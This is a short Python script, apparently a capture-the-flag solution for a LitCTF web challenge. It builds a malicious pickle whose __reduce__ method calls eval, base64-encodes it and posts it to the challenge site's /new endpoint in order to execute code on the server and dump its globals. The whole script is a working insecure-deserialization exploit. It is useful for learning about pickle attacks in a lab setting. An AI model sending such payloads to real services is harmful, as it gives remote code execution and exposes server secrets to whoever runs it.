import pickle
import requests
import base64
url = "https://a-flask-of-pickles.litctf.live/"
#url = "http://127.0.0.1:5000/"

class Exploit():
	def __reduce__(self):
		return eval, ("str(globals())", )

payload = pickle.dumps({"name": "", "bio": Exploit()})
print(payload, len(payload))
resp = requests.post(url + "new", data=base64.b64encode(payload))
print(url + resp.text)
